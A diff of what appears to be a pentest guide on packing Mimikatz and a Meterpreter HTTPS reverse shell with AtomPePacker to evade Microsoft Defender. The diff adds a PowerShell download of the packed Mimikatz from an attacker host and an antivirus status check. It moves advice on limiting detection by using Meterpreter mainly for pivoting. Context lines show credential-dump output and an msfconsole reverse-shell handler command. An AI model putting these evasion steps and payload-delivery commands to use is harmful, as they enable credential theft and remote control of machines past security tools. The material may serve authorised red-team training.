@@ -1,4 +1,3 @@
-
 ================================================================================================================================================
 Antivirus/EDR bypass using the packer 'AtomPePacker'
 ================================================================================================================================================
@@ -58,7 +57,6 @@ C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\AtomPePacker-m
 
 => Rename the file "PP64Stub.exe" by "PePacker-Mimi.exe"
 
-
 -------------------------------------------------------------------------------------------------------------------------------------------
 Step 2 - Download and execute on a Windows 10 laptop the packed version of Mimikatz.exe without being detected/blocked by Defender Antivirus 
 -------------------------------------------------------------------------------------------------------------------------------------------
@@ -68,6 +66,8 @@ Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
 Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\temp> wget -URI http://192.168.1.30:8080/PePacker-Mimi.exe -OutFile PePacker-Mimi.exe
 
 PS C:\temp> amsiscanbuffer
 At line:1 char:1
@@ -139,7 +139,6 @@ SID               : S-1-5-21-936125016-2310263949-2175806047-500
         ssp :
         credman :
         cloudap :       KO
-        
  <SNIP>
 
 
@@ -179,6 +178,7 @@ C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\AtomPePacker-m
 
 => Rename the file "H_PP64Stub.exe" by "PePacker-Shellcode.exe"
 
+
 ------------------------------------------------------------------------------------------------------------------------------------
 Step 3 - Download and execute on a Windows 10 laptop the packed version of the Meterpreter HTTPS reverse shell (x64) without being 
          detected nor blocked by the Microsoft Defender Antivirus 
@@ -190,21 +190,27 @@ PS C:\temp> .\PePacker-Shellcode.exe
 
 PS C:\temp>
 
+PS C:\temp> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+
+
+Important note regarding AV detection  
+-------------------------------------
+=> While the Meterpreter was not detected by the Microsoft Defender Antivirus it was flagged by the HP Malware Protection and Threat containment solution
+   running on the Windows 10 laptop.
+=> In general, if you want to limit the chance of being detected & blocked by antivirus it is recommanded to use the Meterpreter session mainly as a way 
+   to pivot and perform lateral movement (i.e. socks_proxy + proxychains).  
+   Indeed, if you use well knwon post-exploitation modules like "hashdump" or even just the "shell" command, antivirus like MS Defender will detect these 
+   actions as 'Behavior:Win32/Meterpreter.gen!D' or 'Behavior:Win32/Meterpreter.A!sms' and will kill the Meterpreter session.
+
 
 ------------------------------------------------------------------------------------------------------------------------------------
 Step 4 - Enjoy the Meterpreter reverse shell running on the target Windows 10 laptop 
 ------------------------------------------------------------------------------------------------------------------------------------
 
-Important note regarding AV detection  
--------------------------------------
-=> While the Meterpreter was not detected by the Microsoft Defender Antivirus it was flagged by the HP Malware Protection and Threat containment
-   running on the Windows 10 laptop.
-=> If you want to limit the chance of being detected & blocked by antivirus like MS Defender it is recommanded to use the Meterpreter session only 
-   as a way to pivot (i.e. socks_proxy + proxychains).
-=> If you use well knwon post-exploitation modules like "hashdump" or even just the "shell" command, antivirus like MS Defender will
-   detect these actions as 'Behavior:Win32/Meterpreter.gen!D' or 'Behavior:Win32/Meterpreter.A!sms' and will kill the Meterpreter session.
-                
-                
 jeff@kali:~/Documents/Tools$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_https; set LHOST 192.168.1.30; 
 set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; 
 set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem;  run -j"                                                                                             
